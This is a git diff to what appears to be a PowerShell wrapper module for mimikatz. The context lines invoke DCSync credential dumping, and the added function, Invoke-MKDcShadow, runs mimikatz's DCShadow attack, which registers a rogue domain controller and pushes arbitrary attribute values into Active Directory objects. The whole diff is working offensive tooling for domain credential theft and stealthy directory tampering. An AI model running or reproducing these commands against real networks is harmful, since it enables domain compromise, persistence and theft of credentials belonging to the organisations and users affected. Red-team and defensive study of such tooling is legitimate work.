@@ -107,3 +107,32 @@ function Invoke-MKDcSync {
 
     .\mimikatz.exe privilege::debug token::elevate "lsadump::dcsync /user:$UserName /domain:$Domain" exit
 }
+
+function Invoke-MKDcShadow {
+    param(
+        [Parameter(Mandatory, ParameterSetName = 'push')]   
+        [Switch]$Push,
+        [Parameter(ParameterSetName = 'rpc')]   
+        [string]$Domain,
+        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
+        [string]$Object,
+        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
+        [string]$Attribute,
+        [Parameter(Mandatory, ParameterSetName = 'rpc')]   
+        [string]$Value
+    )
+
+    Begin {
+        if ($PSCmdlet.ParameterSetName -eq 'push') {
+            .\mimikatz.exe privilege::debug "lsadump::dcshadow /push" exit
+        }
+        else {
+            if ($PSBoundParameters.ContainsKey("Domain")) {
+                .\mimikatz.exe privilege::debug "lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value /domain:$Domain"
+            }
+            else {
+                .\mimikatz.exe privilege::debug "lsadump::dcshadow /object:$Object /attribute:$attribute /value:$Value"
+            }
+        }
+    }
+}
